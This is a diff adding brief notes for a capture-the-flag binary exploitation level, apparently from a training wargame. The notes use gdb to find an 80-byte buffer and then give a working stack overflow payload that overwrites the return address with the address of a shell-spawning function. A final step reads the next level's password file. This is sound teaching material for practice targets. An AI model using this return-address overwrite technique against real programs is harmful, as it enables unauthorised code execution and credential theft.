@@ -1,0 +1,19 @@
+
+- Like level0, gdb level1, info functions and see a main and run
+
+- Disas main and run and we see main function call run
+
+- And run function do a sys call
+
+- We see buffer of $0x50 bytes = 80 in main function
+
+- We need to overflow the buffer in the main and go to 0x08048444 (run address)
+
+- Create a payload: python -c "print 'a' * 76 + '\x44\x84\x04\x08'" > /tmp/payload && cat /tmp/payload - | ./level1
+
+> Explanation: buffer size = 80 - adress size = 76 so we print any char 76 times
+> 0x08048444 = 0x08 0x04 0x84 0x44 because it's a 4-bytes value
+> And we nee to use it as little endian format so we reverse
+> 0x08 0x04 0x84 0x44 => 0x44 0x84 0x04 0x08 = \x44\x84\x04\x08
+
+- Cat /home/user/level2/.pass and get the flag
